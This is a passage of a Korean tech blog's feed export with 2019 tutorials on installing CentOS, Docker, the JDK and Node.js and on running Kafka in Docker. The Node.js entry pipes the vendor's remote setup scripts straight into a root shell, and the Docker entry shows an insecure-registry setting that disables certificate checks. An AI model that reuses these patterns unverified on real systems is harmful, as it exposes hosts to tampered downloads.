class="code"><pre><span class="line">mv /var/lib/docker/* /home/docker/</span><br></pre></td></tr></table></figure><p>다음 명령어를 이용하여 Docker 프로세스를 실행한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><h2 id="참고자료"><a href="#참고자료" class="headerlink" title="참고자료"></a>참고자료</h2><ul><li><a href="https://www.flaticon.com/authors/icongeek26" target="_blank" rel="noopener">Icons made by Icongeek26 CC 3.0 BY</a></li><li><a href="http://dveamer.github.io/backend/DockerImageDirectory.html" target="_blank" rel="noopener">Docker 설치 후 이미지 보관 디렉토리 변경</a></li><li><a href="https://stackoverflow.com/questions/26166550/set-docker-opts-in-centos" target="_blank" rel="noopener">Set Docker_Opts in centos</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/2019/08/07/change-docker-data-dir/directory.svg&quot; width=&quot;200&quot;&gt;

&lt;p&gt;Docker는 기본적으로 &lt;code&gt;/var/lib/docker&lt;/code&gt; 디렉토리에 Docker Image 등의 데이터를 저장한다.&lt;br&gt;이 상태로 두면 서버의 루트 용량이 적을 경우 Docker의 데이터로 인해 루트가 가득 차 각종 오류를 일으킬 수 있다.&lt;/p&gt;
&lt;p&gt;따라서 Docker 데이터 디렉토리를 큰 용량을 가진 별도의 디렉토리로 변경할 필요가 있다.&lt;br&gt;이 페이지에서는 &lt;code&gt;/home/docker&lt;/code&gt; 디렉토리로 변경한다.&lt;/p&gt;
    
    </summary>
    
      <category term="시스템 구축" scheme="https://www.jslee.me/categories/%EC%8B%9C%EC%8A%A4%ED%85%9C-%EA%B5%AC%EC%B6%95/"/>
    
    
      <category term="Docker" scheme="https://www.jslee.me/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Node.js 설치하기</title>
    <link href="https://www.jslee.me/2019/08/06/install-nodejs/"/>
    <id>https://www.jslee.me/2019/08/06/install-nodejs/</id>
    <published>2019-08-06T11:21:42.000Z</published>
    <updated>2019-08-06T05:08:11.231Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/2019/08/06/install-nodejs/nodejs-logo.svg" width="250"><p><a href="https://github.com/nodesource/distributions/blob/master/README.md" target="_blank" rel="noopener">https://github.com/nodesource/distributions/blob/master/README.md</a></p><p>위 페이지를 참고하여 Node.js를 설치하는 공식적인 방법을 정리한다.</p><a id="more"></a><h2 id="설치"><a href="#설치" class="headerlink" title="설치"></a>설치</h2><p>다음 명령어를 이용하여 각 환경에서 Node.js를 설치할 수 있다.</p><h3 id="Ubuntu-또는-Debian-기반"><a href="#Ubuntu-또는-Debian-기반" class="headerlink" title="Ubuntu 또는 Debian 기반"></a>Ubuntu 또는 Debian 기반</h3><h4 id="U-D-기반-Node-js-v12-x-설치"><a href="#U-D-기반-Node-js-v12-x-설치" class="headerlink" title="U/D 기반 Node.js v12.x 설치"></a>U/D 기반 Node.js v12.x 설치</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Using Ubuntu</span></span><br><span class="line">curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using Debian, as root</span></span><br><span class="line">curl -sL https://deb.nodesource.com/setup_12.x | bash -</span><br><span class="line">apt-get install -y nodejs</span><br></pre></td></tr></table></figure><h4 id="U-D-기반-Node-js-v11-x-설치"><a href="#U-D-기반-Node-js-v11-x-설치" class="headerlink" title="U/D 기반 Node.js v11.x 설치"></a>U/D 기반 Node.js v11.x 설치</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Using Ubuntu</span></span><br><span class="line">curl -sL https://deb.nodesource.com/setup_11.x | sudo -E bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using Debian, as root</span></span><br><span class="line">curl -sL https://deb.nodesource.com/setup_11.x | bash -</span><br><span class="line">apt-get install -y nodejs</span><br></pre></td></tr></table></figure><h4 id="U-D-기반-Node-js-v10-x-설치"><a href="#U-D-기반-Node-js-v10-x-설치" class="headerlink" title="U/D 기반 Node.js v10.x 설치"></a>U/D 기반 Node.js v10.x 설치</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Using Ubuntu</span></span><br><span class="line">curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using Debian, as root</span></span><br><span class="line">curl -sL https://deb.nodesource.com/setup_10.x | bash -</span><br><span class="line">apt-get install -y nodejs</span><br></pre></td></tr></table></figure><h3 id="Enterprise-Linux-기반-CentOS-RHEL-Fedora-등"><a href="#Enterprise-Linux-기반-CentOS-RHEL-Fedora-등" class="headerlink" title="Enterprise Linux 기반 (CentOS, RHEL, Fedora 등)"></a>Enterprise Linux 기반 (CentOS, RHEL, Fedora 등)</h3><h4 id="EL-기반-Node-js-v12-x-설치"><a href="#EL-기반-Node-js-v12-x-설치" class="headerlink" title="EL 기반 Node.js v12.x 설치"></a>EL 기반 Node.js v12.x 설치</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sL https://rpm.nodesource.com/setup_12.x | bash -</span><br></pre></td></tr></table></figure><h4 id="EL-기반-Node-js-v11-x-설치"><a href="#EL-기반-Node-js-v11-x-설치" class="headerlink" title="EL 기반 Node.js v11.x 설치"></a>EL 기반 Node.js v11.x 설치</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sL https://rpm.nodesource.com/setup_11.x | bash -</span><br></pre></td></tr></table></figure><h4 id="EL-기반-Node-js-v10-x-설치"><a href="#EL-기반-Node-js-v10-x-설치" class="headerlink" title="EL 기반 Node.js v10.x 설치"></a>EL 기반 Node.js v10.x 설치</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sL https://rpm.nodesource.com/setup_10.x | bash -</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/2019/08/06/install-nodejs/nodejs-logo.svg&quot; width=&quot;250&quot;&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/nodesource/distributions/blob/master/README.md&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/nodesource/distributions/blob/master/README.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;위 페이지를 참고하여 Node.js를 설치하는 공식적인 방법을 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="시스템 구축" scheme="https://www.jslee.me/categories/%EC%8B%9C%EC%8A%A4%ED%85%9C-%EA%B5%AC%EC%B6%95/"/>
    
    
      <category term="Node.js" scheme="https://www.jslee.me/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>Docker를 이용하여 Zookeeper와 Kafka 실행하기</title>
    <link href="https://www.jslee.me/2019/08/05/run-kafka-with-docker/"/>
    <id>https://www.jslee.me/2019/08/05/run-kafka-with-docker/</id>
    <published>2019-08-05T11:31:52.000Z</published>
    <updated>2019-08-05T14:08:10.021Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/2019/08/05/run-kafka-with-docker/kafka-logo.png" width="200"><p>Docker를 이용하여 Kafka와 Zookeeper 서비스를 구동하는 방법을 정리한다.</p><a id="more"></a><h3 id="버전"><a href="#버전" class="headerlink" title="버전"></a>버전</h3><p>2019년 07월 29일 시점에서 최신 버전인 Kafka 2.12-2.3.0, Zookeeper 3.5.5 버전을 기준으로 설명한다.</p><h2 id="Docker-Network-설정"><a href="#Docker-Network-설정" class="headerlink" title="Docker Network 설정"></a>Docker Network 설정</h2><p>다음 명령어를 이용하여 Kafka와 Zookeeper가 통신하기 위해 사용할 Docker Network를 생성한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network create kafka</span><br></pre></td></tr></table></figure><h2 id="Zookeeper-서비스-구동"><a href="#Zookeeper-서비스-구동" class="headerlink" title="Zookeeper 서비스 구동"></a>Zookeeper 서비스 구동</h2><p><a href="https://hub.docker.com/_/zookeeper" target="_blank" rel="noopener">https://hub.docker.com/_/zookeeper</a></p><p>Zookeeper는 공식 Docker 이미지를 제공하고 있다.</p><p>다음 명령어를 통해 Docker를 이용하여 Zookeeper 서비스를 실행한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=zookeeper --net=kafka -p 2181:2181 zookeeper</span><br></pre></td></tr></table></figure><h2 id="Kafka-서비스-구동"><a href="#Kafka-서비스-구동" class="headerlink" title="Kafka 서비스 구동"></a>Kafka 서비스 구동</h2><p><a href="https://hub.docker.com/r/wurstmeister/kafka" target="_blank" rel="noopener">https://hub.docker.com/r/wurstmeister/kafka</a></p><p>Kafka는 wurstmeister라는 사람이 만든 이미지를 이용하여 실행시킬 수 있다.</p><p>다음 명령어를 통해 Docker를 이용하여 Kafka 서비스를 실행한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name kafka --net=kafka -p 9092:9092 -e KAFKA_ADVERTISED_LISTENERS=<span class="string">"PLAINTEXT://localhost:9092"</span> -e KAFKA_LISTENERS=<span class="string">"PLAINTEXT://0.0.0.0:9092"</span> -e KAFKA_ADVERTISED_HOST_NAME=<span class="string">"127.0.0.1"</span> -e KAFKA_ADVERTISED_PORT=<span class="string">"9092"</span> -e KAFKA_ZOOKEEPER_CONNECT=<span class="string">"zookeeper:2181"</span> -e KAFKA_CREATE_TOPICS=<span class="string">"javainuse-topic:1:1"</span> wurstmeister/kafka</span><br></pre></td></tr></table></figure><h2 id="Kafka-서비스-테스트"><a href="#Kafka-서비스-테스트" class="headerlink" title="Kafka 서비스 테스트"></a>Kafka 서비스 테스트</h2><h2 id="확인-사항"><a href="#확인-사항" class="headerlink" title="확인 사항"></a>확인 사항</h2><h3 id="Java-설치-확인"><a href="#Java-설치-확인" class="headerlink" title="Java 설치 확인"></a>Java 설치 확인</h3><p>Java가 설치되어 있지 않으면 <a href="https://www.notion.so/93c3d7fb-8c5b-472f-af4f-8a7c67d51de1" target="_blank" rel="noopener">CentOS에 JDK 설치</a> 문서를 참고하여 Java를 설치한다.</p><h3 id="바이너리-다운로드"><a href="#바이너리-다운로드" class="headerlink" title="바이너리 다운로드"></a>바이너리 다운로드</h3><p><a href="https://kafka.apache.org/downloads" target="_blank" rel="noopener">https://kafka.apache.org/downloads</a></p><p>위 사이트에서 Kafka Docker 이미지의 버전과 동일한 버전의 바이너리 파일 주소를 복사한다.</p><p>본 문서를 작성하는 시점에서는 다음과 같았다.</p><p><a href="http://apache.mirror.cdnetworks.com/kafka/2.3.0/kafka_2.12-2.3.0.tgz" target="_blank" rel="noopener">http://apache.mirror.cdnetworks.com/kafka/2.3.0/kafka_2.12-2.3.0.tgz</a></p><p>다음 명령어를 통해 Kafka 바이너리 파일을 다운로드한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://apache.mirror.cdnetworks.com/kafka/2.3.0/kafka_2.12-2.3.0.tgz</span><br></pre></td></tr></table></figure><p>다음 명령어를 통해 압축을 해제한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf kafka_2.12-2.3.0.tgz</span><br></pre></td></tr></table></figure><p>다음 명령어를 통해 안으로 들어간다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> kafka_2.12-2.3.0</span><br></pre></td></tr></table></figure><h3 id="Topic-생성-테스트"><a href="#Topic-생성-테스트" class="headerlink" title="Topic 생성 테스트"></a>Topic 생성 테스트</h3><p>다음 명령어를 통해 Kafka Topic을 생성할 수 있다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --bootstrap-server localhost:9092 --create --topic <span class="built_in">test</span> --partitions 1 --replication-factor 1</span><br></pre></td></tr></table></figure><h3 id="Topic-확인-테스트"><a href="#Topic-확인-테스트" class="headerlink" title="Topic 확인 테스트"></a>Topic 확인 테스트</h3><p>다음 명령어를 통해 Kafka Topic을 확인할 수 있다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --bootstrap-server localhost:9092 --describe</span><br></pre></td></tr></table></figure><h3 id="Consumer-테스트"><a href="#Consumer-테스트" class="headerlink" title="Consumer 테스트"></a>Consumer 테스트</h3><p>다음 명령어를 통해 Kafka Console Consumer를 테스트할 수 있다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --from-beginning --bootstrap-server localhost:9092 --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h3 id="Producer-테스트"><a href="#Producer-테스트" class="headerlink" title="Producer 테스트"></a>Producer 테스트</h3><p>다음 명령어를 통해 Kafka Console Consumer를 테스트할 수 있다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-producer.sh --broker-list localhost:9092 --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h3 id="Topic-삭제-테스트"><a href="#Topic-삭제-테스트" class="headerlink" title="Topic 삭제 테스트"></a>Topic 삭제 테스트</h3><p>다음 명령어를 통해 Kafka Topic을 삭제할 수 있다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --bootstrap-server localhost:9092 --delete --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/2019/08/05/run-kafka-with-docker/kafka-logo.png&quot; width=&quot;200&quot;&gt;

&lt;p&gt;Docker를 이용하여 Kafka와 Zookeeper 서비스를 구동하는 방법을 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="시스템 구축" scheme="https://www.jslee.me/categories/%EC%8B%9C%EC%8A%A4%ED%85%9C-%EA%B5%AC%EC%B6%95/"/>
    
    
      <category term="Docker" scheme="https://www.jslee.me/tags/Docker/"/>
    
      <category term="Zookeeper" scheme="https://www.jslee.me/tags/Zookeeper/"/>
    
      <category term="Kafka" scheme="https://www.jslee.me/tags/Kafka/"/>
    
  </entry>
  
  <entry>
    <title>CentOS에 JDK 설치하기</title>
    <link href="https://www.jslee.me/2019/08/04/install-jdk-on-centos/"/>
    <id>https://www.jslee.me/2019/08/04/install-jdk-on-centos/</id>
    <published>2019-08-04T04:33:35.000Z</published>
    <updated>2019-08-04T06:16:12.078Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/2019/08/04/install-jdk-on-centos/java-jdk-logo.jpg" width="300"><p>CentOS 환경에 Java를 설치하는 방법을 정리한다.</p><a id="more"></a><h2 id="OpenJDK"><a href="#OpenJDK" class="headerlink" title="OpenJDK"></a>OpenJDK</h2><h3 id="OpenJDK-버전"><a href="#OpenJDK-버전" class="headerlink" title="OpenJDK 버전"></a>OpenJDK 버전</h3><p>2019년 07월 29일 기준으로 최신 버전인 build 12+32를 이용하여 설명한다.</p><h3 id="OpenJDK-다운로드"><a href="#OpenJDK-다운로드" class="headerlink" title="OpenJDK 다운로드"></a>OpenJDK 다운로드</h3><p><a href="http://jdk.java.net/" target="_blank" rel="noopener">http://jdk.java.net</a></p><p>위 사이트에서 JDK 최신 버전의 링크를 복사한다.</p><p>본 문서 작성일 기준으로 다음과 같았다.</p><p><a href="https://download.java.net/openjdk/jdk12/ri/openjdk-12+32_linux-x64_bin.tar.gz" target="_blank" rel="noopener">https://download.java.net/openjdk/jdk12/ri/openjdk-12+32_linux-x64_bin.tar.gz</a></p><p>다음 명령어로 해당 JDK 압축 파일을 다운로드한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.java.net/openjdk/jdk12/ri/openjdk-12+32_linux-x64_bin.tar.gz</span><br></pre></td></tr></table></figure><h3 id="OpenJDK-설치"><a href="#OpenJDK-설치" class="headerlink" title="OpenJDK 설치"></a>OpenJDK 설치</h3><p>다음 명령어로 다운로드 한 압축 파일의 압축을 해제한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf openjdk-12+32_linux-x64_bin.tar.gz</span><br></pre></td></tr></table></figure><p>다음 명령어로 JDK 디렉토리를 이동하고 심볼릭 링크를 생성한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv jdk-12 /usr/<span class="built_in">local</span>/</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span></span><br><span class="line">ln -sf jdk-12 java</span><br></pre></td></tr></table></figure><p>사용 중인 쉘의 rc 파일의 가장 아래에 다음 구문을 추가한다. (.bashrc, .zshrc 등)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/java/bin</span><br><span class="line"><span class="built_in">export</span> PATH</span><br></pre></td></tr></table></figure><p>다음 명령어로 사용 중인 쉘의 rc 파일을 적용한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>다음 명령어로 Java와 컴파일러를 정상적으로 사용할 수 있는지 확인한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java --version</span><br><span class="line">javac --version</span><br></pre></td></tr></table></figure><h2 id="Oracle-JDK"><a href="#Oracle-JDK" class="headerlink" title="Oracle JDK"></a>Oracle JDK</h2><p>2018년 7월부터 Oracle JDK의 Java SE Subscription 라이센스 정책이 시행됨에 따라 상업용으로 이용하려면 라이센스 구독을 해야 한다.</p><p>다만 Oracle JDK 1.8.202 버전 이하는 여전히 프로그램의 동작을 위한 목적에 한하여 무료로 사용 가능한 Binary Code License(BCL) 정책을 따른다.</p><h3 id="Oracle-JDK-버전"><a href="#Oracle-JDK-버전" class="headerlink" title="Oracle JDK 버전"></a>Oracle JDK 버전</h3><p>개인용으로 사용할 것인지 상업용으로 사용할 것인지 등에 따라서 원하는 버전이 달라질 수 있다.</p><p>필자는 개인적으로 사용할 예정이므로 2019년 08월 04일 기준으로 최신 버전인 12.0.2를 기준으로 설명한다.</p><h3 id="Oracle-JDK-다운로드"><a href="#Oracle-JDK-다운로드" class="headerlink" title="Oracle JDK 다운로드"></a>Oracle JDK 다운로드</h3><p><a href="https://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">오라클 Java SE 다운로드 페이지</a>에 접속하여 원하는 버전을 다운로드한다.</p><p>오라클 웹 페이지에서는 접속하는 클라이언트가 쿠키 정책에 동의해야만 이후 작업을 처리해 주기 때문에 wget으로 간단하게 다운로드 하기 어렵다.</p><p>그래서 그냥 로컬 컴퓨터로 다운로드 하고 설치하려는 서버에 직접 옮기는 게 편하다.</p><h3 id="Oracle-JDK-설치"><a href="#Oracle-JDK-설치" class="headerlink" title="Oracle JDK 설치"></a>Oracle JDK 설치</h3><p>다음 명령어로 다운로드 한 압축 파일의 압축을 해제한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf jdk-12.0.2_linux-x64_bin.tar.gz</span><br></pre></td></tr></table></figure><p>다음 명령어로 JDK 디렉토리를 이동하고 심볼릭 링크를 생성한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv jdk-12.0.2 /usr/<span class="built_in">local</span>/</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span></span><br><span class="line">ln -sf jdk-12.0.2 java</span><br></pre></td></tr></table></figure><p>사용 중인 쉘의 rc 파일의 가장 아래에 다음 구문을 추가한다. (.bashrc, .zshrc 등)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/java/bin</span><br><span class="line"><span class="built_in">export</span> PATH</span><br></pre></td></tr></table></figure><p>다음 명령어로 사용 중인 쉘의 rc 파일을 적용한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>다음 명령어로 Java와 컴파일러를 정상적으로 사용할 수 있는지 확인한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java --version</span><br><span class="line">javac --version</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/2019/08/04/install-jdk-on-centos/java-jdk-logo.jpg&quot; width=&quot;300&quot;&gt;

&lt;p&gt;CentOS 환경에 Java를 설치하는 방법을 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="시스템 구축" scheme="https://www.jslee.me/categories/%EC%8B%9C%EC%8A%A4%ED%85%9C-%EA%B5%AC%EC%B6%95/"/>
    
    
      <category term="CentOS" scheme="https://www.jslee.me/tags/CentOS/"/>
    
      <category term="Java" scheme="https://www.jslee.me/tags/Java/"/>
    
      <category term="JDK" scheme="https://www.jslee.me/tags/JDK/"/>
    
  </entry>
  
  <entry>
    <title>CentOS에 Docker 설치하기</title>
    <link href="https://www.jslee.me/2019/08/03/install-docker-on-centos/"/>
    <id>https://www.jslee.me/2019/08/03/install-docker-on-centos/</id>
    <published>2019-08-03T04:26:42.000Z</published>
    <updated>2019-08-04T06:16:12.077Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/2019/08/03/install-docker-on-centos/docker-logo.png" width="250"><p>CentOS에 Docker를 설치하는 방법을 정리한다.</p><a id="more"></a><h2 id="설치"><a href="#설치" class="headerlink" title="설치"></a>설치</h2><h3 id="Update-packages"><a href="#Update-packages" class="headerlink" title="Update packages"></a>Update packages</h3><p>다음 명령어로 yum으로 설치된 모든 패키지의 업데이트를 진행한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum update -y</span><br></pre></td></tr></table></figure><h3 id="Docker-설치"><a href="#Docker-설치" class="headerlink" title="Docker 설치"></a>Docker 설치</h3><p>다음 명령어로 yum을 이용하여 Docker를 설치한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y docker</span><br></pre></td></tr></table></figure><p>다음 명령어로 Docker 서비스를 시작한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>다음 명령어로 부팅 시 Docker 서비스를 자동으로 시작하도록 설정한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><h2 id="추가로-확인할-사항"><a href="#추가로-확인할-사항" class="headerlink" title="추가로 확인할 사항"></a>추가로 확인할 사항</h2><h3 id="Insecure-Registry-등록"><a href="#Insecure-Registry-등록" class="headerlink" title="Insecure Registry 등록"></a>Insecure Registry 등록</h3><p>다음과 같이 Docker daemon 설정 파일을 수정하여 (없으면 생성) 다음과 같은 구문을 추가한다.</p><figure class="highlight json"><figcaption><span>/etc/docker/daemon.json</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"insecure-registries"</span>: [<span class="string">"URL:PORT"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그 후 Docker 서비스를 재시작하면 해당 URL에 대하여 Insecure registry 오류가 발생하지 않는다.</p><p>하지만 이 설정은 서버와 통신할 때 적절한 인증서 검증을 사용하지 않게 만들기 때문에 주의가 필요하다.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/2019/08/03/install-docker-on-centos/docker-logo.png&quot; width=&quot;250&quot;&gt;

&lt;p&gt;CentOS에 Docker를 설치하는 방법을 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="시스템 구축" scheme="https://www.jslee.me/categories/%EC%8B%9C%EC%8A%A4%ED%85%9C-%EA%B5%AC%EC%B6%95/"/>
    
    
      <category term="CentOS" scheme="https://www.jslee.me/tags/CentOS/"/>
    
      <category term="Docker" scheme="https://www.jslee.me/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 설치하기</title>
    <link href="https://www.jslee.me/2019/08/02/install-centos/"/>
    <id>https://www.jslee.me/2019/08/02/install-centos/</id>
    <published>2019-08-01T19:43:35.000Z</published>
    <updated>2019-08-04T05:15:25.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/2019/08/02/install-centos/centos-logo.png" width="200"><p>운영체제 CentOS를 설치하는 방법을 정리한다.</p><a id="more"></a><h3 id="버전"><a href="#버전" class="headerlink" title="버전"></a>버전</h3><p>2019년 07월 29일 기준으로 최신 버전인 CentOS 7 1810 버전을 이용하여 설명한다.</p><h2 id="CentOS-다운로드"><a href="#CentOS-다운로드" class="headerlink" title="CentOS 다운로드"></a>CentOS 다운로드</h2><p><a href="https://www.centos.org/download/" target="_blank" rel="noopener">https://www.centos.org/download/</a></p><p>위 경로에서 최신 버전의 CentOS DVD ISO 파일을 다운로드한다.</p><h2 id="CentOS-설치-환경-구성"><a href="#CentOS-설치-환경-구성" class="headerlink" title="CentOS 설치 환경 구성"></a>CentOS 설치 환경 구성</h2><p>다음 중 하나의 방식으로 CentOS 설치 환경을 구성한다.</p><ul><li>로컬 컴퓨터에 VMware 등의 가상화 도구를 이용하여 가상 머신 생성</li><li>직접 CentOS를 설치할 컴퓨터 준비<ul><li>Rufus 등의 도구를 이용하여 CentOS 설치 USB 생성</li></ul></li></ul><h2 id="CentOS-설치"><a href="#CentOS-설치" class="headerlink" title="CentOS 설치"></a>CentOS 설치</h2><p>설치 이미지를 실행하여 가이드에 따라 한국어를 선택하여 설치를 진행한다.</p><p>다음과 같이 설정하고 설치 시작 버튼을 클릭한다.</p><ul><li>설치 대상<ul><li>자동 파티션 설정 선택</li></ul></li><li>네트워크 및 호스트명<ul><li>유선으로 … 연결되었습니다</li></ul></li><li>그 외 기본값</li></ul><p>설치되는 동안 루트 계정의 암호를 설정하고 관리자 계정을 생성한다.</p><p>설치가 완료될 때까지 대기한 후 안내에 따라 기기를 재시작한다.</p><p>그러면 CentOS 설치가 완료된다.</p><h2 id="추가로-확인할-사항"><a href="#추가로-확인할-사항" class="headerlink" title="추가로 확인할 사항"></a>추가로 확인할 사항</h2><h3 